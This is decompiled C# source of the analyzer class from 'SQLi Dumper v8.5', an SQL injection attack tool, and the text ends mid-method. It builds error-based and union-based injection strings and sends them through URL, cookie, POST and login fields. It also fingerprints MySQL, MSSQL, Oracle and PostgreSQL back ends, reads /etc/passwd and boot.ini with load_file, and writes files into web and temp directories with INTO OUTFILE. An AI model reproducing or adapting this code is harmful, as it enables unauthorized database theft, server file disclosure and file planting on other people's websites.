// Decompiled with JetBrains decompiler
// Type: Analizer
// Assembly: SQLi Dumper, Version=8.5.0.0, Culture=neutral, PublicKeyToken=null
// MVID: FFDD07D3-5737-4188-BACA-DE2D004C7CCF
// Assembly location: C:\Users\cole\Desktop\SQLi Dumper v8.5 [VeryClean]\SQLi v.8.5 VeryClean by Stephanny.exe

using DataBase;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.Net;
using System.Runtime.CompilerServices;
using System.Threading;

public class Analizer
{
  private int __Threads;
  private int __TimeOut;
  private int __Delay;
  private int __Retry;
  private enHTTPMethod __HTTPMethod;
  private Analizer.InjectionPoint __InjectionPoint;
  private List<string> __Unions;
  private int __UnionStart;
  private int __UnionEnd;
  private bool __CheckErrorBasead;
  private bool __CheckUnionInteger;
  private bool __CheckUnionKeyword;
  private bool __CheckUnionInMySQL_Error;
  private bool __CheckUnionInMSSQL_Error;
  private bool __Cancel;
  private bool __Paused;
  private ThreadPool __ThreadPoolAnalizer;
  private bool __CheckErrorPoints;
  private bool __RetryExceded;
  private bool __IsFullAnalized;
  private const string LOADING_STR = "Analizer thread, ";
  private const string ERROR_INTEGER = "[t]";
  private const string ERROR_INTEGER_1 = "[t] and 1=1";
  private const string ERROR_INTEGER_2 = " or 1=[t] and 1=1";
  private const string ERROR_INTEGER_3 = " and [t] and 1=1";
  private const string ERROR_STRING = "' [t] '";
  private const string ERROR_STRING_1 = "' and [t] and '1'='1";
  private const string ERROR_STRING_2 = "' or 1=[t] and '1'='1";
  private const string ERROR_STRING_3 = "' or 1=[t]--";
  [SpecialName]
  private long .STATIC.CheckRequestDelay.2001.LastTick;
  [SpecialName]
  private StaticLocalInitFlag .STATIC.CheckRequestDelay.2001.LastTick.Init;

  public string URL { get; set; }

  public string Cookies { get; set; }

  public string POST { get; set; }

  public string LoginUser { get; set; }

  public string LoginPassword { get; set; }

  public bool Running { get; set; }

  public Types SQLType { get; set; }

  public MySQLErrorType MySQLErrorType { get; set; }

  public MySQLCollactions MySQLCollactions { get; set; }

  public OracleErrorType OracleErrorType { get; set; }

  public bool OracleCast { get; set; }

  public bool MSSQLCollate { get; set; }

  public string MSSQLCast { get; set; }

  public string WebServer { get; set; }

  public string InjectQuery { get; set; }

  public int UnionCount { get; set; }

  public int UnionString { get; set; }

  public InjectionType Result { get; set; }

  public object Tag
  {
    get => this._Tag;
    set => this._Tag = RuntimeHelpers.GetObjectValue(value);
  }

  public event Analizer.OnProgressEventHandler OnProgress;

  public event Analizer.OnStartEventHandler OnStart;

  public event Analizer.OnCompleteEventHandler OnComplete;

  public Analizer(int iThreads, int iTimeOut, int iDelay, int iRetry, bool bCheckErrorPoints = false)
  {
    this.URL = "";
    this.Cookies = "";
    this.POST = "";
    this.LoginUser = "";
    this.LoginPassword = "";
    this.SQLType = Types.Unknown;
    this.MySQLCollactions = MySQLCollactions.UnHex;
    this.OracleCast = false;
    this.MSSQLCast = "char";
    this.STATIC.CheckRequestDelay.2001.LastTick.Init = new StaticLocalInitFlag();
    this.__Threads = iThreads;
    this.__TimeOut = iTimeOut;
    this.__Delay = iDelay;
    this.__Retry = iRetry;
    this.__CheckErrorPoints = bCheckErrorPoints;
  }

  public void Paused(bool b) => this.__Paused = b;

  public void Cancel() => this.__Cancel = true;

  public void Start(
    Analizer.InjectionPoint iPoint,
    enHTTPMethod iHTTPMethod,
    string sUrl,
    ref List<string> iUnions,
    int iUnionStart = 1,
    int iUnionEnd = 30,
    string sCookies = "",
    string sPost = "",
    string sLoginUser = "",
    string sLoginPassword = "",
    bool bCheckErrorBasead = true,
    bool bCheckUnionInteger = true,
    bool bCheckUnionKeyword = false,
    bool bCheckUnionInMySQL_Error = true,
    bool bCheckUnionInMSSQL_Error = false,
    Types oSQLType = Types.Unknown)
  {
    this.__InjectionPoint = iPoint;
    this.__HTTPMethod = iHTTPMethod;
    this.__Unions = iUnions;
    this.__UnionStart = iUnionStart;
    this.__UnionEnd = iUnionEnd;
    this.URL = sUrl;
    this.Cookies = sCookies;
    this.POST = sPost;
    this.LoginUser = sLoginUser;
    this.LoginPassword = this.LoginPassword;
    this.__CheckErrorBasead = bCheckErrorBasead;
    this.__CheckUnionInteger = bCheckUnionInteger;
    this.__CheckUnionKeyword = bCheckUnionKeyword;
    this.__CheckUnionInMySQL_Error = bCheckUnionInMySQL_Error;
    this.__CheckUnionInMSSQL_Error = bCheckUnionInMSSQL_Error;
    this.__IsFullAnalized = true;
    this.__Cancel = false;
    this.__Paused = false;
    this.Running = true;
    this.SQLType = oSQLType;
    this.Result = InjectionType.None;
    Analizer.OnStartEventHandler onStartEvent = this.OnStartEvent;
    if (onStartEvent != null)
      onStartEvent(this);
    new Thread(new ThreadStart(this.IniThreads)).Start();
  }

  public bool CheckMagicQuotes(string sTraject)
  {
    bool flag1;
    try
    {
      Analizer.OnProgressEventHandler onProgressEvent = this.OnProgressEvent;
      if (onProgressEvent != null)
        onProgressEvent("Analizer thread, Checking Magic Quotes", -1, this);
      string str1 = "'ABC145ZQ62DWQAFPOIYCFD'";
      if (this.SQLType == Types.Unknown | this.SQLType == Types.None)
        this.SQLType = this.CheckTypeDB(sTraject);
      bool flag2 = true;
      if (Utls.TypeIsMySQL(this.SQLType) || flag2 == Utls.TypeIsMSSQL(this.SQLType) || (flag2 == Utls.TypeIsOracle(this.SQLType) || flag2 != Utls.TypeIsPostgreSQL(this.SQLType)))
        ;
      List<string> lColumn = new List<string>();
      lColumn.Add(str1);
      string str2;
      switch (this.SQLType)
      {
        case Types.MySQL_No_Error:
          str2 = MySQLNoError.Info(sTraject, this.MySQLCollactions, false, lColumn);
          break;
        case Types.MySQL_With_Error:
          str2 = MySQLWithError.Info(sTraject, this.MySQLCollactions, this.MySQLErrorType, lColumn);
          break;
        case Types.MSSQL_No_Error:
          str2 = MSSQL.Info(sTraject, InjectionType.Union, this.MSSQLCollate, lColumn, this.MSSQLCast);
          break;
        case Types.MSSQL_With_Error:
          str2 = MSSQL.Info(sTraject, InjectionType.Error, this.MSSQLCollate, lColumn, this.MSSQLCast);
          break;
        case Types.Oracle_No_Error:
          str2 = Oracle.Info(sTraject, InjectionType.Error, OracleErrorType.NONE, lColumn, true);
          break;
        case Types.Oracle_With_Error:
          str2 = Oracle.Info(sTraject, InjectionType.Union, OracleErrorType.NONE, lColumn, true);
          break;
        case Types.PostgreSQL_No_Error:
          str2 = PostgreSQL.Info(sTraject, InjectionType.Union, PostgreSQLErrorType.NONE, lColumn);
          break;
        case Types.PostgreSQL_With_Error:
          str2 = PostgreSQL.Info(sTraject, InjectionType.Error, PostgreSQLErrorType.NONE, lColumn);
          break;
        default:
          return false;
      }
      Analizer.HTMLParams p = new Analizer.HTMLParams();
      p.URL = this.URL;
      p.Cookies = this.Cookies;
      p.POST = this.POST;
      p.LoginUser = this.LoginUser;
      p.LoginPassword = this.LoginPassword;
      switch (this.__InjectionPoint)
      {
        case Analizer.InjectionPoint.URL:
          p.URL = str2;
          break;
        case Analizer.InjectionPoint.Cookies:
          p.Cookies = str2;
          break;
        case Analizer.InjectionPoint.POST:
          p.POST = str2;
          break;
        case Analizer.InjectionPoint.LoginUser:
          p.LoginUser = str2;
          break;
        case Analizer.InjectionPoint.LoginPassword:
          p.LoginPassword = str2;
          break;
      }
      flag1 = this.LoadHTML(p).ToLower().Contains(str1.ToLower());
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return flag1;
  }

  public bool CheckServerInfo(
    string sTraject,
    ref string sVersion,
    ref string sUser,
    bool bOnlyVersion = false)
  {
    bool flag1;
    try
    {
      string sData = "";
      string[] strArray1 = new string[2];
      InjectionType injectionType = !sTraject.ToLower().Contains("union".ToLower()) ? InjectionType.Error : InjectionType.Union;
      if (this.SQLType == Types.None)
        this.SQLType = this.CheckTypeDB(sTraject);
      if (!Utls.TypeIsInjecatble(this.SQLType))
      {
        Analizer.OnProgressEventHandler onProgressEvent = this.OnProgressEvent;
        if (onProgressEvent != null)
          onProgressEvent("Analizer thread, Checking inject params..", -1, this);
        if (!Utls.TypeIsInjecatble(this.SQLType))
          return false;
        if (sTraject.ToLower().Contains("union".ToLower()))
        {
          if (!this.TestUnion(sTraject))
            return false;
        }
        else if (!this.TryErrorBasead(sTraject))
          return false;
      }
      if (!this.CheckCollactions(sTraject, injectionType, this.SQLType))
        return false;
      int index = 0;
      do
      {
        if (!(bOnlyVersion & index == 0))
        {
          if (index == 0)
          {
            Analizer.OnProgressEventHandler onProgressEvent = this.OnProgressEvent;
            if (onProgressEvent != null)
              onProgressEvent("Analizer thread, Checking Server Info (version)", -1, this);
          }
          else
          {
            Analizer.OnProgressEventHandler onProgressEvent = this.OnProgressEvent;
            if (onProgressEvent != null)
              onProgressEvent("Analizer thread, Checking Server Info (user)", -1, this);
          }
          bool flag2 = true;
          if (Utls.TypeIsMySQL(this.SQLType))
          {
            strArray1[0] = "user()";
            strArray1[1] = "version()";
          }
          else if (flag2 == Utls.TypeIsMSSQL(this.SQLType))
          {
            strArray1[0] = "system_user";
            strArray1[1] = "@@version";
          }
          else if (flag2 == Utls.TypeIsOracle(this.SQLType))
          {
            strArray1[0] = "(select user from dual)";
            strArray1[1] = "(select banner from v$version where banner like " + Globals.G_Utilities.ConvertTextToSQLChar("%Oracle%", false, "||", "chr") + ")";
          }
          else if (flag2 == Utls.TypeIsPostgreSQL(this.SQLType))
          {
            strArray1[0] = "user";
            strArray1[1] = "version()";
          }
          List<string> lColumn = new List<string>();
          lColumn.Add(strArray1[index]);
          switch (this.SQLType)
          {
            case Types.MySQL_No_Error:
              sData = MySQLNoError.Info(sTraject, this.MySQLCollactions, false, lColumn);
              break;
            case Types.MySQL_With_Error:
              sData = MySQLWithError.Info(sTraject, this.MySQLCollactions, this.MySQLErrorType, lColumn);
              break;
            case Types.MSSQL_No_Error:
              sData = MSSQL.Info(sTraject, InjectionType.Union, this.MSSQLCollate, lColumn, this.MSSQLCast);
              break;
            case Types.MSSQL_With_Error:
              sData = MSSQL.Info(sTraject, injectionType, this.MSSQLCollate, lColumn, this.MSSQLCast);
              break;
            case Types.Oracle_No_Error:
              sData = Oracle.Info(sTraject, InjectionType.Union, this.OracleErrorType, lColumn, this.OracleCast);
              break;
            case Types.Oracle_With_Error:
              sData = Oracle.Info(sTraject, injectionType, this.OracleErrorType, lColumn, this.OracleCast);
              break;
            case Types.PostgreSQL_No_Error:
              sData = PostgreSQL.Info(sTraject, InjectionType.Union, PostgreSQLErrorType.NONE, lColumn);
              break;
            case Types.PostgreSQL_With_Error:
              sData = PostgreSQL.Info(sTraject, injectionType, PostgreSQLErrorType.CAST_INT, lColumn);
              break;
          }
          Analizer.HTMLParams p = new Analizer.HTMLParams();
          p.URL = this.URL;
          p.Cookies = this.Cookies;
          p.POST = this.POST;
          p.LoginUser = this.LoginUser;
          p.LoginPassword = this.LoginPassword;
          switch (this.__InjectionPoint)
          {
            case Analizer.InjectionPoint.URL:
              p.URL = sData;
              break;
            case Analizer.InjectionPoint.Cookies:
              p.Cookies = sData;
              break;
            case Analizer.InjectionPoint.POST:
              p.POST = sData;
              break;
            case Analizer.InjectionPoint.LoginUser:
              p.LoginUser = sData;
              break;
            case Analizer.InjectionPoint.LoginPassword:
              p.LoginPassword = sData;
              break;
          }
          sData = this.LoadHTML(p);
          if (!string.IsNullOrEmpty(sData))
          {
            List<string> htmlData = Globals.G_Dumper.ParseHtmlData(sData, this.SQLType);
            if (htmlData.Count > 0)
            {
              string[] strArray2 = Strings.Split(htmlData[0], Globals.COLLUMNS_SPLIT_STR);
              if (index == 0)
                sUser = strArray2[0];
              else
                sVersion = strArray2[0];
              flag1 = true;
            }
          }
          if (this.PausedOrCanceled())
            break;
        }
        checked { ++index; }
      }
      while (index <= 1);
      sVersion = sVersion.Replace("Microsoft SQL Server", "MS SQL");
      if (sVersion.IndexOf("\n") > 0)
        sVersion = sVersion.Replace("\n", ", ");
      if (sVersion.IndexOf("\v\n") > 0)
        sVersion = sVersion.Replace("\v\n", ", ");
      if (sVersion.IndexOf("\r") > 0)
        sVersion = sVersion.Replace("\r", ", ");
      if (sVersion.IndexOf("\r\n") > 0)
        sVersion = sVersion.Replace("\r\n", ", ");
      if (sUser.IndexOf("\n") > 0)
        sUser = sUser.Split('\n')[0].Trim();
      if (sUser.IndexOf("\v\n") > 0)
        sUser = sUser.Split('\v')[0].Trim();
      if (sUser.IndexOf("\r") > 0)
        sUser = sUser.Split('\r')[0].Trim();
      if (sUser.IndexOf("\r\n") > 0)
        sUser = sUser.Split('\r')[0].Trim();
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return flag1;
  }

  public bool CheckLoadFileMySQL(string sTraject, ref string sPath)
  {
    bool flag;
    try
    {
      if (string.IsNullOrEmpty(sPath))
      {
        while (true)
        {
          List<string> stringList = new List<string>();
          int num;
          switch (num)
          {
            case 0:
              sPath = "/etc/passwd";
              break;
            case 1:
              sPath = "c:\\\\boot.ini";
              break;
            case 2:
              sPath = "d:\\\\boot.ini";
              break;
            case 3:
              sPath = "c://boot.ini";
              break;
            case 4:
              sPath = "c:/boot.ini";
              break;
            default:
              goto label_13;
          }
          if (!this.MySQL_LoadFile(sTraject, sPath))
          {
            if (!this.PausedOrCanceled())
              checked { ++num; }
            else
              goto label_13;
          }
          else
            break;
        }
        flag = true;
      }
      else
        flag = this.MySQL_LoadFile(sTraject, sPath);
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
label_13:
    return flag;
  }

  public bool CheckWriteMySQL(string sTraject, bool bLinux, ref string sPath, bool bOutfile = true)
  {
    bool flag1;
    try
    {
      string str1 = DateAndTime.Now.Ticks.ToString() + ".tmp";
      do
      {
        string sTraject1 = sTraject;
        Analizer.HTMLParams p = new Analizer.HTMLParams();
        p.URL = this.URL;
        p.Cookies = this.Cookies;
        p.POST = this.POST;
        p.LoginUser = this.LoginUser;
        p.LoginPassword = this.LoginPassword;
        int num1;
        if (!bLinux)
        {
          switch (num1)
          {
            case 0:
              sPath = "c:\\\\";
              break;
            case 1:
              sPath = "d:\\\\";
              break;
            case 2:
              sPath = "e:\\\\";
              break;
            case 3:
              sPath = "";
              break;
            default:
              goto label_37;
          }
        }
        else
          goto label_30;
label_6:
        sPath += str1;
        string str2 = !bOutfile ? " into dumpfile '" + sPath + "'" : " into outfile '" + sPath + "'";
        int num2 = sTraject1.IndexOf("[t]");
        int num3 = checked (sTraject1.Length - 1);
        int startIndex = num2;
        while (startIndex <= num3)
        {
          bool flag2 = sTraject1.Substring(startIndex, 1).Equals("&");
          if (checked (startIndex + 1) <= checked (sTraject1.Length - 1))
            flag2 |= sTraject1.Substring(startIndex, 2).Equals("--");
          if (checked (startIndex + 3) <= checked (sTraject1.Length - 1))
            flag2 |= sTraject1.Substring(startIndex, 4).Equals("/--/");
          if (!flag2)
          {
            checked { ++startIndex; }
          }
          else
          {
            sTraject1 = sTraject1.Insert(startIndex, str2);
            break;
          }
        }
        if (!sTraject1.Contains(str2))
          sTraject1 += str2;
        List<string> lColumn = new List<string>();
        lColumn.Add(Globals.G_Utilities.ConvertTextToHex("1922312454"));
        string str3;
        switch (this.SQLType)
        {
          case Types.MySQL_No_Error:
            str3 = MySQLNoError.Info(sTraject1, this.MySQLCollactions, false, lColumn);
            break;
          case Types.MySQL_With_Error:
            str3 = MySQLWithError.Info(sTraject1, this.MySQLCollactions, this.MySQLErrorType, lColumn);
            break;
          default:
            goto label_38;
        }
        switch (this.__InjectionPoint)
        {
          case Analizer.InjectionPoint.URL:
            p.URL = str3;
            break;
          case Analizer.InjectionPoint.Cookies:
            p.Cookies = str3;
            break;
          case Analizer.InjectionPoint.POST:
            p.POST = str3;
            break;
          case Analizer.InjectionPoint.LoginUser:
            p.LoginUser = str3;
            break;
          case Analizer.InjectionPoint.LoginPassword:
            p.LoginPassword = str3;
            break;
        }
        if (!string.IsNullOrEmpty(this.LoadHTML(p)) && this.MySQL_LoadFile(sTraject, sPath))
          flag1 = true;
        checked { ++num1; }
        if (!flag1)
          continue;
        break;
label_30:
        switch (num1)
        {
          case 0:
            sPath = "/var/www/";
            goto label_6;
          case 1:
            sPath = "/tmp/";
            goto label_6;
          case 2:
            sPath = "/var/tmp/";
            goto label_6;
          case 3:
            sPath = "";
            goto label_6;
          default:
            goto label_36;
        }
      }
      while (!this.PausedOrCanceled());
      goto label_40;
label_36:
      return false;
label_37:
      return false;
label_38:
      return false;
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
label_40:
    if (!flag1)
      sPath = "";
    return flag1;
  }

  private bool MySQL_LoadFile(string sTraject, string sPath)
  {
    bool flag;
    try
    {
      List<string> lColumn = new List<string>();
      lColumn.Add("load_file(" + Globals.G_Utilities.ConvertTextToHex(sPath) + ")");
      string str;
      switch (this.SQLType)
      {
        case Types.MySQL_No_Error:
          str = MySQLNoError.Info(sTraject, this.MySQLCollactions, false, lColumn);
          break;
        case Types.MySQL_With_Error:
          str = MySQLWithError.Info(sTraject, this.MySQLCollactions, this.MySQLErrorType, lColumn);
          break;
        default:
          return false;
      }
      Analizer.HTMLParams p = new Analizer.HTMLParams();
      p.URL = this.URL;
      p.Cookies = this.Cookies;
      p.POST = this.POST;
      p.LoginUser = this.LoginUser;
      p.LoginPassword = this.LoginPassword;
      switch (this.__InjectionPoint)
      {
        case Analizer.InjectionPoint.URL:
          p.URL = str;
          break;
        case Analizer.InjectionPoint.Cookies:
          p.Cookies = str;
          break;
        case Analizer.InjectionPoint.POST:
          p.POST = str;
          break;
        case Analizer.InjectionPoint.LoginUser:
          p.LoginUser = str;
          break;
        case Analizer.InjectionPoint.LoginPassword:
          p.LoginPassword = str;
          break;
      }
      string sData = this.LoadHTML(p);
      if (!string.IsNullOrEmpty(sData))
      {
        if (Globals.G_Dumper.ParseHtmlData(sData, this.SQLType).Count > 0)
          flag = true;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    return flag;
  }

  private void IniThreads()
  {
    try
    {
      string sInputUrl = "";
      List<string> lTraject = new List<string>();
      bool flag1 = this.__CheckUnionInteger | this.__CheckUnionKeyword;
      string sTraject = "";
      switch (this.__InjectionPoint)
      {
        case Analizer.InjectionPoint.URL:
          sInputUrl = this.URL;
          break;
        case Analizer.InjectionPoint.Cookies:
          sInputUrl = this.Cookies;
          break;
        case Analizer.InjectionPoint.POST:
          sInputUrl = this.POST;
          break;
        case Analizer.InjectionPoint.LoginUser:
          sInputUrl = this.LoginUser;
          break;
        case Analizer.InjectionPoint.LoginPassword:
          sInputUrl = this.LoginPassword;
          break;
      }
      List<string> lUnions = new List<string>();
      lUnions.AddRange((IEnumerable<string>) this.__Unions.ToArray());
      Types sqlType;
      bool flag2;
      if (this.__CheckErrorBasead & sInputUrl.ToLower().IndexOf("union".ToLower()) < 0)
      {
        if (sInputUrl.IndexOf("[t]") > 1)
          lTraject.Add(sInputUrl);
        int num1 = 0;
        lTraject.Clear();
label_33:
        lTraject.AddRange((IEnumerable<string>) Analizer.BuildTraject(sInputUrl, "[t]"));
        while (true)
        {
          string str = num1 > 4 ? "Error String" : "Error Integer";
          int num2 = checked (lTraject.Count - 1);
          int index = 0;
          while (index <= num2)
          {
            sTraject = lTraject[index];
            Analizer.OnProgressEventHandler onProgressEvent = this.OnProgressEvent;
            if (onProgressEvent != null)
              onProgressEvent("Analizer thread, trying Error Basead (" + str + ") " + Conversions.ToString(checked (num1 + 1)) + "/8", checked ((int) Math.Round(unchecked ((double) checked (num1 + 1 * 100) / 7.0))), this);
            if (this.SQLType == Types.None | this.SQLType == Types.Unknown)
              this.SQLType = this.CheckTypeDB(lTraject[index]);
            if (this.SQLType == Types.None & this.__CheckErrorPoints)
              this.Result = InjectionType.None;
            else if (this.TryErrorBasead(lTraject[index]))
            {
              sqlType = this.SQLType;
              flag2 = true;
            }
            if (!flag2)
            {
              this.__RetryExceded = false;
              checked { ++index; }
            }
            else
              break;
          }
          if (!flag2)
          {
            this.__RetryExceded = false;
            checked { ++num1; }
            if (num1 <= 7)
            {
              lTraject.Clear();
              switch (num1)
              {
                case 0:
                  goto label_33;
                case 1:
                  lTraject.AddRange((IEnumerable<string>) Analizer.BuildTraject(sInputUrl, "[t] and 1=1"));
                  continue;
                case 2:
                  lTraject.AddRange((IEnumerable<string>) Analizer.BuildTraject(sInputUrl, " or 1=[t] and 1=1", true));
                  continue;
                case 3:
                  lTraject.AddRange((IEnumerable<string>) Analizer.BuildTraject(sInputUrl, " and [t] and 1=1", true));
                  continue;
                case 4:
                  lTraject.AddRange((IEnumerable<string>) Analizer.BuildTraject(sInputUrl, "' [t] '", true));
                  lTraject.AddRange((IEnumerable<string>) Analizer.BuildTraject(sInputUrl, "' [t] '".Replace("'", "\""), true));
                  continue;
                case 5:
                  lTraject.AddRange((IEnumerable<string>) Analizer.BuildTraject(sInputUrl, "' and [t] and '1'='1", true));
                  lTraject.AddRange((IEnumerable<string>) Analizer.BuildTraject(sInputUrl, "' and [t] and '1'='1".Replace("'", "\""), true));
                  continue;
                case 6:
                  lTraject.AddRange((IEnumerable<string>) Analizer.BuildTraject(sInputUrl, "' or 1=[t] and '1'='1", true));
                  lTraject.AddRange((IEnumerable<string>) Analizer.BuildTraject(sInputUrl, "' or 1=[t] and '1'='1".Replace("'", "\""), true));
                  continue;
                case 7:
                  lTraject.AddRange((IEnumerable<string>) Analizer.BuildTraject(sInputUrl, "' or 1=[t]--", true));
                  lTraject.AddRange((IEnumerable<string>) Analizer.BuildTraject(sInputUrl, "' or 1=[t]--".Replace("'", "\""), true));
                  continue;
                default:
                  continue;
              }
            }
            else
              break;
          }
          else
            break;
        }
        if (flag2)
        {
          bool flag3 = true;
          flag1 = !Utls.TypeIsMySQL(this.SQLType) ? flag3 == Utls.TypeIsMSSQL(this.SQLType) && (this.__CheckUnionInMSSQL_Error && flag1) : this.__CheckUnionInMySQL_Error && flag1;
          if (flag1)
          {
            lUnions.Clear();
            lock (this.__Unions)
            {
              int num2 = checked (this.__Unions.Count - 1);
              int index = 0;
              while (index <= num2)
              {
                if (sTraject.Contains("'") & this.__Unions[index].Contains("'"))
                  lUnions.Add(this.__Unions[index]);
                else if (!sTraject.Contains("'") & !this.__Unions[index].Contains("'"))
                  lUnions.Add(this.__Unions[index]);
                if (sTraject.Contains("\"") & this.__Unions[index].Contains("\""))
                  lUnions.Add(this.__Unions[index]);
                else if (!sTraject.Contains("\"") & !this.__Unions[index].Contains("\""))
                  lUnions.Add(this.__Unions[index]);
                checked { ++index; }
              }
            }
            flag1 = lUnions.Count > 0;
          }
        }
      }
      if (flag1)
      {
        lTraject.Clear();
        if (flag2)
        {
          string str = this.RemoveErrCode(sTraject);
          lTraject.Add(str);
        }
        else
        {
          if (sInputUrl.IndexOf("[t]") > 0)
            return;
          lTraject.AddRange((IEnumerable<string>) Analizer.BuildTraject(sInputUrl, "[t]"));
        }
        this.TryUnionBasead(lTraject, lUnions);
        if (this.UnionString > 0 | !flag2 & this.UnionCount > 0)
        {
          this.Result = InjectionType.Union;
        }
        else
        {
          if (!flag2)
            return;
          this.Result = InjectionType.Error;
          this.SQLType = sqlType;
        }
      }
      else
      {
        if (!flag2)
          return;
        this.Result = InjectionType.Error;
      }
    }
    catch (Exception ex)
    {
      ProjectData.SetProjectError(ex);
      ProjectData.ClearProjectError();
    }
    finally
    {
      this.Running = false;
      Analizer.OnCompleteEventHandler onCompleteEvent = this.OnCompleteEvent;
      if (onCompleteEvent != null)
        onCompleteEvent(this);
    }
  }

  private string RemoveErrCode(string sTraject)
  {
    sTraject = sTraject.Replace("' [t] '", "[t]");
    sTraject = sTraject.Replace("' and [t] and '1'='1", "[t]");
    sTraject = sTraject.Replace("' or 1=[t] and '1'='1", "[t]");
    sTraject = sTraject.Replace("' or 1=[t]--", "[t]");
    sTraject = sTraject.Replace("' [t] '".Replace('\'', '"'), "[t]");
    sTraject = sTraject.Replace("' and [t] and '1'='1".Replace('\'', '"'), "[t]");
    sTraject = sTraject.Replace("' or 1=[t] and '1'='1".Replace('\'', '"'), "[t]");
    sTraject = sTraject.Replace("' or 1=[t]--".Replace('\'', '"'), "[t]");
    sTraject = sTraject.Replace("[t]", "[t]");
    sTraject = sTraject.Replace("[t] and 1=1", "[t]");
    sTraject = sTraject.Replace(" or 1=[t] and 1=1", "[t]");
    sTraject = sTraject.Replace(" and [t] and 1=1", "[t]");
    return sTraject;
  }

  private bool TryErrorBasead(string sTraject)
  {
    bool flag1;
    try
    {
      string sText = "ABC145ZQ62DWQAFPOIYCFD";
      bool flag2 = true;
      int num;
      if (Utls.TypeIsMySQL(this.SQLType))
        num = 0;
      else if (flag2 == Utls.TypeIsMSSQL(this.SQLType))
        num = 4;
      else if (flag2 == Utls.TypeIsOracle(this.SQLType))
        num = 6;
      else if (flag2 == Utls.TypeIsPostgreSQL(this.SQLType))
        num = 12;
      while (true)
      {
        List<string> lColumn = new List<string>();
        bool flag3 = true;
        string str1;
        if (num > 2)
        {
          if (flag3 == num <= 5)
            str1 = Globals.G_Utilities.ConvertTextToSQLChar(sText, false);
          else if (flag3 == num <= 9)
            str1 = Globals.G_Utilities.ConvertTextToSQLChar(sText, false, "||", "chr");
          else
            goto label_44;
        }
        else
          goto label_34;
label_12:
        lColumn.Add(str1);
        string str2;
        switch (num)
        {
          case 0:
            str2 = MySQLWithError.Info(sTraject, this.MySQLCollactions, MySQLErrorType.DuplicateEntry, lColumn);
            this.MySQLErrorType = MySQLErrorType.DuplicateEntry;
            break;
          case 2:
            str2 = MySQLWithError.Info(sTraject, this.MySQLCollactions, MySQLErrorType.ExtractValue, lColumn);
            this.MySQLErrorType = MySQLErrorType.ExtractValue;
            break;
          case 3:
            str2 = MySQLWithError.Info(sTraject, this.MySQLCollactions, MySQLErrorType.UpdateXML, lColumn);
            this.MySQLErrorType = MySQLErrorType.UpdateXML;
            break;
          case 4:
            str2 = MSSQL.Info(sTraject, InjectionType.Error, this.MSSQLCollate, lColumn, "");
            break;
          case 5:
            this.MSSQLCollate = !this.MSSQLCollate;
            str2 = MSSQL.Info(sTraject, InjectionType.Error, this.MSSQLCollate, lColumn, "");
            break;
          case 6:
            str2 = Oracle.Info(sTraject, InjectionType.Error, OracleErrorType.GET_HOST_ADDRESS, lColumn, this.OracleCast);
            this.OracleErrorType = OracleErrorType.GET_HOST_ADDRESS;
            break;
          case 7:
            str2 = Oracle.Info(sTraject, InjectionType.Error, OracleErrorType.DRITHSX_SN, lColumn, this.OracleCast);
            this.OracleErrorType = OracleErrorType.DRITHSX_SN;
            break;
          case 8:
            str2 = Oracle.Info(sTraject, InjectionType.Error, OracleErrorType.GETMAPPINGXPATH, lColumn, this.OracleCast);
            this.OracleErrorType = OracleErrorType.GETMAPPINGXPATH;
            break;
          case 9:
            this.OracleCast = !this.OracleCast;
            str2 = Oracle.Info(sTraject, InjectionType.Error, OracleErrorType.GET_HOST_ADDRESS, lColumn, this.OracleCast);
            this.OracleErrorType = OracleErrorType.GET_HOST_ADDRESS;
            break;
          case 10:
            str2 = Oracle.Info(sTraject, InjectionType.Error, OracleErrorType.DRITHSX_SN, lColumn, this.OracleCast);
            this.OracleErrorType = OracleErrorType.DRITHSX_SN;
            break;
          case 11:
            str2 = Oracle.Info(sTraject, InjectionType.Error, OracleErrorType.GETMAPPINGXPATH, lColumn, this.OracleCast);
            this.OracleErrorType = OracleErrorType.GETMAPPINGXPATH;
            break;
          case 12:
            str2 = PostgreSQL.Info(sTraject, InjectionType.Error, PostgreSQLErrorType.CAST_INT, lColumn);
            break;
          default:
            goto label_44;
        }
        Analizer.HTMLParams p = new Analizer.HTMLParams();
        p.URL = this.URL;
        p.Cookies = this.Cookies;
        p.POST = this.POST;
        p.LoginUser = this.LoginUser;
        p.LoginPassword = this.LoginPassword;
        switch (this.__InjectionPoint)
        {
          case Analizer.InjectionPoint.URL:
            p.URL = str2;
            break;
          case Analizer.InjectionPoint.Cookies:
            p.Cookies = str2;
            break;
          case Analizer.InjectionPoint.POST:
            p.POST = str2;
            break;
          case Analizer.InjectionPoint.LoginUser:
            p.LoginUser = str2;
            break;
          case Analizer.InjectionPoint.LoginPassword:
            p.LoginPassword = str2;
            break;
        }
        if (!this.LoadHTML(p).ToLower().Contains(sText.ToLower()))
        {
          bool flag4 = true;
          if (1 != (num <= 3 || !Utls.TypeIsMySQL(this.SQLType) ? 0 : 1) && (flag4 ? 1 : 0) != (num <= 5 || !Utls.TypeIsMSSQL(this.SQLType) ? 0 : 1) && ((flag4 ? 1 : 0) != (num <= 11 || !Utls.TypeIsOracle(this.SQLType) ? 0 : 1) && ((flag4 ? 1 : 0) != (num <= 12 || !Utls.TypeIsPostgreSQL(this.SQLType) ? 0 : 1) && !this.PausedOrCanceled())))
          {
            checked { ++num; }
            continue;
          }
          goto label_44;
        }
        else
          break;
label_34:
        str1 = Globals.G_Utilities.ConvertTextToHex(sText);
        goto label_12;
      }
      flag1 = true;
      this.InjectQuery = sTraject;
      bool flag5 = true;
      if (num <= 3)
        this.SQLType = Types.MySQL_With_Error;
      else if (flag5 == num <= 5)
        this.SQLType = Types.MSSQL_With_Error;
      else if (flag5 == num <= 11)
        this.SQLType = Types.Oracle_With_Error;
      else if (flag5 == num <= 12)
        this.SQLType = Types.PostgreSQL_With_Error;
label_44:
      if (flag1)
      {
        switch (this.SQLType)
        {
          case Types.MySQL_With_Error:
          case Types.MSSQL_With_Error:
            flag1 = this.CheckCollactions(sTraject, InjectionType.Error, this.SQLType);
            break;
        }
      }
    }
